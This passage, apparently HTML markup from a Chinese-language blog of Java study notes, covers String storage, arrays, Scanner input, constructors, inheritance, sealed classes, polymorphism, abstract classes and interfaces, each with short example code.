&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toCharArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cs&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;X&amp;#39;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是因为通过&lt;code>new String(char[])&lt;/code>创建新的&lt;code>String&lt;/code>实例时，它并不会直接引用传入的&lt;code>char[]&lt;/code>数组，而是会复制一份，所以，修改外部的&lt;code>char[]&lt;/code>数组不会影响&lt;code>String&lt;/code>实例内部的&lt;code>char[]&lt;/code>数组，因为这是两个不同的数组&lt;/p>
&lt;ul>
&lt;li>早期的String总以char[]进行存储&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">String&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">offset&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">count&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而较新的JDK版本的&lt;code>String&lt;/code>则以&lt;code>byte[]&lt;/code>存储：如果&lt;code>String&lt;/code>仅包含ASCII字符，则每个&lt;code>byte&lt;/code>存储一个字符，否则，每两个&lt;code>byte&lt;/code>存储一个字符，这样做的目的是为了节省内存，因为大量的长度较短的&lt;code>String&lt;/code>通常仅包含ASCII字符&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">String&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">coder&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 0 = LATIN1, 1 = UTF16
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于使用者来说，&lt;code>String&lt;/code>内部的优化不影响任何已有代码，因为它的&lt;code>public&lt;/code>方法签名是不变的&lt;/p>
&lt;h3 id="数组">数组&lt;/h3>
&lt;ul>
&lt;li>新建数组&lt;code>int[] n = new int[5];&lt;/code>，大小不可变，为引用类型&lt;/li>
&lt;li>对于数组元素（或所有可迭代的数据类型）的遍历直接使用&lt;code>for(int n:na){}&lt;/code>，缺点是无法指定遍历顺序，无法获取数组索引（n直接代表元素）&lt;/li>
&lt;li>快速打印数组内容&lt;code>System.out.println(Arrays.toString(ns));&lt;/code>&lt;/li>
&lt;li>快速打印二维数组内容&lt;code>System.out.println(Arrays.deepToString(ns));&lt;/code>&lt;/li>
&lt;li>可变参数用&lt;code>类型...&lt;/code>定义，可变参数相当于数组类型&lt;/li>
&lt;/ul>
&lt;h3 id="流程控制">流程控制&lt;/h3>
&lt;ul>
&lt;li>读取输入需要&lt;code>import java.util.Scanner&lt;/code>，由&lt;code>Scanner&lt;/code>对象进行读入操作&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Scanner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">scanner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">in&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input your name: &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input your age: &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hi, %s, you are %d\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>switch语句不要忘break，case不用花括号&lt;/li>
&lt;li>&lt;code>default&lt;/code>语句，可以在漏写某个枚举常量时自动报错，从而及时发现错误&lt;/li>
&lt;/ul>
&lt;h2 id="oop基础">OOP基础&lt;/h2>
&lt;h3 id="类实例">类&amp;amp;实例&lt;/h3>
&lt;ul>
&lt;li>对象靠new&lt;/li>
&lt;li>一个java源文件可以包含多个类的定义，但只能定义一个public类，且public类名必须与文件名一致；如果要定义多个public类，必须拆到多个Java源文件中&lt;/li>
&lt;/ul>
&lt;h3 id="方法">方法&lt;/h3>
&lt;ul>
&lt;li>语法&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>修饰符 方法返回类型 方法名(方法参数列表) {
若干方法语句;
return 方法返回值;
}
// 无return 返回类型为void
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>变量设为private后可以通过public对外的方法间接修改&lt;/li>
&lt;li>没事儿就尽可能少用public，少暴露对外的方法&lt;/li>
&lt;li>与类名相同的方法作为construct构造方法，无返回值&lt;/li>
&lt;li>先初始化字段，再执行构造方法（可覆盖前面的&lt;/li>
&lt;li>可定义多个构造方法（传入参数类型 数量不同），new时会自动匹配；一个构造方法可以调用其他构造方法（便于代码复用），语法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用另一个构造方法Person(String, int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unnamed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用另一个构造方法Person(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>非构造方法也可有多个重名的（参数不同 返回值通常相同），称为方法重载(Overload)，便于用一个名字处理多种参数输入&lt;/li>
&lt;/ul>
&lt;h3 id="继承多态">继承&amp;amp;多态&lt;/h3>
&lt;ul>
&lt;li>使用&lt;code>extends&lt;/code>关键字，例&lt;code>class Student extends Person&lt;/code>&lt;/li>
&lt;li>subclass == extended class; super class == parent class == base class&lt;/li>
&lt;li>子类不可访问父类的&lt;code>private&lt;/code>字段和方法，不能覆写父类带有&lt;code>final&lt;/code>关键字的方法，不能继承带有&lt;code>final&lt;/code>的类，不能重新赋值带有&lt;code>final&lt;/code>的字段&lt;/li>
&lt;li>&lt;code>private&lt;/code>访问权限被限定在&lt;code>class&lt;/code>的内部，而且与方法声明顺序无关；如果一个类内部还定义了nested class嵌套类，那么，嵌套类拥有访问&lt;code>private&lt;/code>的权限&lt;/li>
&lt;li>定义为&lt;code>protected&lt;/code>的字段和方法可以被子类访问，以及子类的子类&lt;/li>
&lt;li>继承之后&lt;code>super.name&lt;/code>, &lt;code>this.name&lt;/code>, &lt;code>name&lt;/code>都是一个意思，但如果存在方法覆写后调用父类方法就必须用&lt;code>super.name&lt;/code>（联想NodeJS的&lt;code>.call&lt;/code>, &lt;code>.apply&lt;/code> 异曲同工之妙）&lt;/li>
&lt;li>未注明&lt;code>extends xxx&lt;/code>的类自动被补上了&lt;code>extends Object&lt;/code>，最顶层的&lt;code>object&lt;/code>也是可以被覆写的&lt;/li>
&lt;li>任何类的构造方法中第一行语句必须是调用父类的构造方法，如未注明会自动补上&lt;code>super();&lt;/code>，所以如果父类没有默认的构造方法，子类就必须显式调用&lt;code>super()&lt;/code>并给出参数以便让编译器定位到父类的一个合适的构造方法————一句话：子类不继承父类的构造方法，是自动生成的（联想Nodejs执行代码时的wrapper）&lt;/li>
&lt;li>Java15之后允许&lt;code>sealed&lt;/code>修饰class，并可通过&lt;code>permits&lt;/code>限制能从该类继承的子类名称（目前为预览状态，可开启&lt;code>--enable-preview&lt;/code>和&lt;code>--source 15&lt;/code>开启）&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">sealed&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Shape&lt;/span> &lt;span style="color:#111">permits&lt;/span> &lt;span style="color:#111">Rect&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Circle&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Triangle&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// xxx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>向上转型基本无问题，向下可能回报ClassCastException的错误，用&lt;code>instanceof&lt;/code>判断一个实例究竟是不是某种类型&lt;/li>
&lt;li>子类与父类方法签名完全相同时可覆写(Override)，加上&lt;code>@Override&lt;/code>可以让编译器帮助检查是否进行了正确的覆写（非必要）&lt;/li>
&lt;li>new来的对象如果指定的类型不同，实际调用其方法时会不同，run起来才知道具体用的啥，这个叫多态(Polymorphic)，有助于实现功能拓展，封装底层逻辑 优化交互&lt;/li>
&lt;/ul>
&lt;h3 id="抽象类接口">抽象类&amp;amp;接口&lt;/h3>
&lt;ul>
&lt;li>抽象类不实现任何功能 仅为了定义方法签名，目的就是为了让子类继承并覆盖，注意这个类本身也要声明为&lt;code>abstract&lt;/code>作抽象类&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 无子句
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>当我们定义了一个抽象类和N个具体类，我们可以用抽象类作引用类型去引用具体类的子类实例，好处在于对实例的方法进行调用时并不关心抽象类型变量的具体子类型&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Teacher&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 不关心Person变量的具体子类型:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 同样不关心新的子类是如何实现run()方法的：
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Employee&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这种尽量引用高层类型，避免引用实际子类型的方式，称之为面向抽象编程，本质：&lt;/p>
&lt;p>上层代码只定义规范(&lt;code>abstract class Person&lt;/code>)，不需要子类就可以实现业务逻辑（正常编译），具体的业务逻辑由不同的子类实现，调用者并不关心&lt;/p>
&lt;ul>
&lt;li>&lt;code>interface&lt;/code>比抽象类还抽象的纯抽象接口，无实例字段，所有方法都默认&lt;code>public abstract&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>当具体类实现一个接口时需要用&lt;code>implements&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; run&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
